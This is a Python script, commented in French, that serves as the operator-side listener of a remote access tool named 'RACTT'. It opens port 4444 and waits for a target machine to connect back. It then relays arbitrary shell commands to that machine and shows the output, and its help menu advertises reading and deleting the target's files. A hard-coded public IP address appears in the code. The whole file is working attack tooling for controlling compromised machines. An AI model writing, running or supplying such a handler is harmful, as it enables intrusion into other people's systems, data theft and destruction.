import socket
import sys

# --- CONFIGURATION ---
PORT = 4444

HELP_MENU = """
╔══════════════════════════════════════════════════════╗
║                MENU D'AIDE RACTT                     ║
╠══════════════════════════════════════════════════════╣
║  help             → Affiche ce menu                  ║
║  ls / dir         → Lister les fichiers              ║
║  whoami           → Nom de l'utilisateur cible       ║
║  cd [dossier]     → Changer de répertoire            ║
║  cat [fichier]    → Lire le contenu d'un fichier     ║
║  rm [fichier]     → Supprimer un fichier             ║
║  exit             → Fermer la connexion              ║
║  [commande shell] → Toute commande Linux/Windows     ║
╚══════════════════════════════════════════════════════╝
"""

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(1)
    
    print(f"[*] En attente sur le port {PORT} (IP: 77.207.25.30)...")
    conn, addr = s.accept()
    print(f"[+] Connecté à : {addr[0]}")

    while True:
        # Recevoir la réponse de la cible
        conn.settimeout(1.0)
        try:
            data = conn.recv(4096).decode('utf-8', errors='ignore')
            if data: sys.stdout.write(data)
        except socket.timeout:
            pass

        # Entrer une commande
        cmd = input("RACTT > ").strip()
        
        if not cmd: continue

        # --- GESTION DE L'AIDE LOCALE ---
        if cmd.lower() == "help":
            print(HELP_MENU)
            continue 

        if cmd.lower() == "exit":
            conn.send(b"exit\n")
            break

        conn.send((cmd + "\n").encode())

if __name__ == "__main__":
    start_server()
